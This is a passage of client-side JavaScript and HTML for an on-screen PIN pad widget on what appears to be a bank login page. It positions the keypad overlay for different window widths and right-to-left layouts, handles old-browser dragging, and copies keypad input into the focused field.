			  	locationtop = document.all.pp_div.style.pixelTop;
			  	locationleft = document.all.pp_div.style.pixelLeft;
			}
			
			if (pos <= 150)
				locationtop = locationtop + pos;
			else
			  	locationtop = locationtop - pos;
			
			if (locationleft <= 200)
			  	locationleft = locationleft + pos;
			else
			  	locationleft = locationleft - pos;
			
			if (locationtop < scrollTop) 
			  	locationtop = scrollTop;
			else if (locationtop > maxtop)
			  	locationtop = maxtop;
			
			if (locationleft<0)
			  	locationleft=1;
			else if (locationleft >= maxleft)
			  	locationleft=maxleft;
			if (!isIE) {
			  	document.getElementById('pp_div').style.top=locationtop+'px';
			  	document.getElementById('pp_div').style.left=locationleft+'px';
			} else {
			  	document.all.pp_div.style.pixelTop=locationtop;
			  	document.all.pp_div.style.pixelLeft=locationleft;
			}
			display();
		};



		
		fixedDisplay=function(element){
			/* Changes done for 11.0.8 Enhancement
			Virtual Keyboard will be displayed at right hand side of Virtual Keypad image */
			
			/* Fetch element which has focus */	
			var windowWidth  = jQuery(window).width();
			var whatelement="";
			
			whatelement=document.getElementById(element); 
			
			/* Fetch postition of element */
			var leftPosition = whatelement.offsetLeft;
			var topPosition = whatelement.offsetTop;
			var elementWidth = whatelement.offsetWidth;
			var elementHeight = document.getElementById('pp_div').offsetHeight;
			
			
            var leftBuffer = 0;
            var heightBuffer = 0;
            var grouplettBuffer = 0;
            var leftPosTotal = 0;
            var topPosTotal = 0;
             var isRTL ="N";
             if(jQuery('html')&& jQuery('html').css('direction')&& jQuery('html').css('direction')=="rtl"){
             isRTL = "Y";
             }     
               if(parseInt(windowWidth) >= 900){
              		leftBuffer = 110;
              		heightBuffer = 150;
              		grouplettBuffer = 70;
               }else if(parseInt(windowWidth) < 900 && parseInt(windowWidth)>= 800){
                  	leftBuffer = 200;
                  	heightBuffer =150;
                  	grouplettBuffer = 20;
               }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                  	leftBuffer = 270;
                  	heightBuffer =150;
                  	grouplettBuffer = 20;
               }else{
               		leftBuffer = 300;
               		heightBuffer =150;                  	  
                  	grouplettBuffer = 10;                       
               }
               //Added for ticket 734570
               if(jQuery('#isRMLoginPage').length!=0 && typeof jQuery('#isRMLoginPage') != "undefined"){
            	   var isRMLogin = jQuery('#isRMLoginPage').val();
            	   if(isRMLogin === "Y" ){
            		   console.log("RM Authentication page ");
            		   leftBuffer = 0;
                  	   heightBuffer =0;                  	  
                       grouplettBuffer = 20; 
            	   }
               }
			
					if(isRTL=="Y"){
					leftPosTotal = leftPosition - elementWidth - leftBuffer;
					}else{
					leftPosTotal = leftPosition + elementWidth - leftBuffer;
					}
					topPosTotal = topPosition - elementHeight - heightBuffer;
			 		 
               var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
               
                                     			
			if(onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length>0 ){
				document.getElementById('pp_div').style.top = topPosTotal + 'px';
			}else{
				document.getElementById('pp_div').style.top = topPosTotal - 50 +'px';
			} 
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
				if(parseInt(windowWidth) >= 900){	
					document.getElementById('pp_div').style.left = leftPosPercent +25+  '%' ;
				}
				else{		
					document.getElementById('pp_div').style.left = leftPosPercent +82+  '%' ;	
				}		
			}else{
				document.getElementById('pp_div').style.left = leftPosPercent +  '%' ;		
			}	
			if(isRTL=="Y"){
			document.getElementById('pp_div').style.right ='auto';
			}	
			display();
		};
		

                        fixedDisplayBelow=function(element){
                        	console.log("inside fixed display below"+element+"aaaa");
                                    /* Changes done for 11.0.8 Enhancement
                                    Virtual Keyboard will be displayed below */
                                    
                                    var windowWidth  = jQuery(window).width();
                                    /* Fetch element which has focus */       
                                    currentID = element;
                                    var whatelement = document.getElementById(element);
                                                                        
                                    /* Fetch postition of element */
                                    var leftPosition = whatelement.offsetLeft;
                                    var topPosition = whatelement.offsetTop;
                                    var elementWidth = whatelement.offsetWidth;
                                    var elementHeight = document.getElementById('pp_div').offsetHeight;
                                    
                                    var leftBuffer = 0;
                                    var heightBuffer = 0;
                                    
                                    if(parseInt(windowWidth) >= 900){
                                    	leftBuffer = 60;
                                    	heightBuffer = (elementHeight/2) + 36;
                                    } else if(parseInt(windowWidth) < 900 && parseInt(windowWidth)>= 800){
                                    	leftBuffer = 100;
                                    	if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight;
                                    	} else{
                                    		heightBuffer = elementHeight + 5;
                                    	}
                                    }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                                    	leftBuffer = 180;
                                    	if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight;
                                    	} else{
                                    		heightBuffer = elementHeight + 5;
                                    	}
                                    } else{
                                    	leftBuffer = elementWidth;
                                        if(onFocus == 'Y'){
                                    		heightBuffer = elementHeight + 20;
                                    	} else{
                                    		heightBuffer = elementHeight + 25;
                                    	}
                                    }
          
                                    var leftPosTotal;
                                    if(jQuery('.next-genHeader').length>0){
                                    	leftPosTotal = leftPosition - leftBuffer;
                                    }else{
                                    	leftPosTotal = leftPosition + elementWidth - leftBuffer;
                                    }
                                    var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
                                    if(onFocus == 'Y'){            
                                    	//document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 10 +'px';                                    	
                                    	if(jQuery('.next-genHeader').length>0){
                                    	heightBuffer=-220;
                   							document.getElementById('pp_div').style.top=  topPosition +heightBuffer+'px';                                    	
                                    	}else{
                                    		document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    	}
                                    	
                                    }else{
                                    	//document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 15 +'px';                                    	
                                    	if(jQuery('.next-genHeader').length>0){
                                    	heightBuffer=-220;
                   							document.getElementById('pp_div').style.top=  topPosition+heightBuffer +'px';                                    	
                                    	}else{
                                    		document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    	}
                                    }
                                    //document.getElementById('pp_div').style.left= leftPosition + elementWidth - 100 + 'px';
                                    document.getElementById('pp_div').style.left= leftPosPercent + '%';                                               
                                    display();
                        };



                        fixedDisplayAbove=function(element){
                        	console.log("inside fixed display above"+element+"aaaa");
                                    
                                    var windowWidth  = jQuery(window).width();
                                    /* Fetch element which has focus */       
                                    currentID = element;
                                    var whatelement = document.getElementById(element);
                                                                        
                                    /* Fetch postition of element */
                                    var leftPosition = whatelement.offsetLeft;
                                    var topPosition = whatelement.offsetTop;
                                    var elementWidth = whatelement.offsetWidth;
                                    var elementHeight = document.getElementById('pp_div').offsetHeight;
                                    
                                    var leftBuffer = 0;
                                    var heightBuffer = 0;
                                    
                                    if(parseInt(windowWidth) > 900){
                                    	leftBuffer = 10;
                                    	heightBuffer=-220;
                                    } else if(parseInt(windowWidth) <= 900 && parseInt(windowWidth)>= 800){
                                    	leftBuffer = 150;
                                    	heightBuffer=-220;
                                    }else if(parseInt(windowWidth) < 800 && parseInt(windowWidth)>= 640){
                                    	leftBuffer = 210;
                                    	heightBuffer=-220;
                                    } else{
                                    	leftBuffer = 180;
                                    	heightBuffer=-220;
                                    }
                                    var leftPosTotal;
                                    leftPosTotal = leftPosition + elementWidth - leftBuffer;
                                    var leftPosPercent = (parseInt(leftPosTotal)/parseInt(windowWidth))*100;
                                    document.getElementById('pp_div').style.top=  topPosition + heightBuffer +'px';
                                    document.getElementById('pp_div').style.left= leftPosPercent + '%';                                               
                                    display();
                        };




						
						
		closeKeypad=function(){
			jQuery(document.getElementById('pp_div')).hide();
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
			jQuery(document.getElementById('pp_div')).css('visibility','hidden');
			}
		}

ddN4=function(whatLayer){

  if (!isN4) return;
  N4=eval(whatLayer);
  N4.captureEvents(Event.MOUSEDOWN|Event.MOUSEUP);
  N4.onmousedown=function(ctl){

    N4.captureEvents(Event.MOUSEMOVE);
    N4x=ctl.x;
    N4y=ctl.y;
  }
  N4.onmousemove=function(ctl){

    if (isHot){

      N4.moveBy(ctl.x-N4x,ctl.y-N4y);
      return false;
    }
  }
  N4.onmouseup=function(){

    N4.releaseEvents(Event.MOUSEMOVE);
  }
};


donePinPad=function(buffer){
   this.target.value = buffer.value;
	buffer.value = '';
	
};

openPinPadHelp=function() {

    var url = 'pinpad.html';
    newwindow = window.open(url,'Security','height=500,width=700,scrollbars=yes,resizable=yes');
    if (window.focus) {

        newwindow.focus();
    }
};

display=function()
{
	if(navigator.userAgent.toLowerCase().indexOf("msie")!=-1)
	{
	if(document.getElementById('iframetop')!=null)
    {
		
		
        var layerdiv = document.getElementById('pp_div');
        layerdiv.style.display = '';
        
        var iframe = document.getElementById('iframetop');
        iframe.style.display = '';
        iframe.style.width = layerdiv.offsetWidth;
        iframe.style.height = layerdiv.offsetHeight;
        iframe.style.left = layerdiv.offsetLeft;
        iframe.style.top = layerdiv.offsetTop;
        iframe.style.visibility=layerdiv.style.visibility;
    }   
    }
};
setValues =function(strengthImage,strengthValue){
     pwdImageValue = strengthImage;
     pwdStrengthValue = strengthValue;
     
};
function getScrollXY() {
  var scrOfX = 0, scrOfY = 0;
  if( typeof( window.pageYOffset ) == 'number' ) {
    
    scrOfY = window.pageYOffset;
    scrOfX = window.pageXOffset;
  } else if( document.body && ( document.body.scrollLeft || document.body.scrollTop ) ) {
    
    scrOfY = document.body.scrollTop;
    scrOfX = document.body.scrollLeft;
  } else if( document.documentElement && ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {
    
    scrOfY = document.documentElement.scrollTop;
    scrOfX = document.documentElement.scrollLeft;
  }
  return [ scrOfX, scrOfY ];
}
--></script>


<script  type="text/javascript">
document.onmousedown=ddInit;
document.onmouseup=Function("ddEnabled=false");
</script>
<iframe id="iframetop" scrolling="no" frameborder="0"> </iframe>
	<div id="pp_div" valign="right" class="keypaddiv">
<div id="scriptdiv"></div>
</div>

<script  type="text/javascript">ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);</script>


<html>
<head>
</head>
<body>
<table>




</table>
</body>
  
